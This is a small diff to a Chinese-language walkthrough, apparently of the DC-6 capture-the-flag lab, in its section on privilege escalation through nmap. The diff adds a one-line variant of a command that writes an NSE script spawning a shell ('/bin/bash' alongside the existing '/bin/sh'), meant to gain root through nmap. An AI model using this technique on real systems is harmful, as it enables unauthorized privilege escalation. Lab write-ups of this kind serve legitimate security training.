@@ -464,6 +464,9 @@ nmap提权
 jens@dc-6:~$ echo 'os.execute("/bin/sh")' > bash.nse
 ```
 
+```shell
+echo 'os.execute("/bin/bash")' > bash.nse
+```
 为什么不是bash，笔者在使用bash的时候出现了无法交互的问题，所以在这里使用了sh
 
 ```shell
